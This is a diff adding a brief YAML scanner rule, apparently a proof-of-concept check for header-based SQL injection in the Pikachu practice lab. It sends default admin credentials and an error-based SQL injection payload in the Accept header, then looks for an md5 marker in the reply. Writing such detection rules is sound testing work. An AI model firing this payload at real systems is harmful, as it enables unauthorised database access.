@@ -1,0 +1,11 @@
+name: sql-header-pikachu-POST
+type: SQLI
+rules:
+  - method: POST
+    path: vul/sqli/sqli_header/sqli_header_login.php
+    body: username=admin&password=123456&submit=Login
+    headers:
+      Accept: 9'and extractvalue(1,concat(0x7e,md5(99999999))) and'
+      Content-type: application/x-www-form-urlencoded
+    expression: result.contains("ef775988943825d2871e1cfa75473ec")
+author: ch4ser
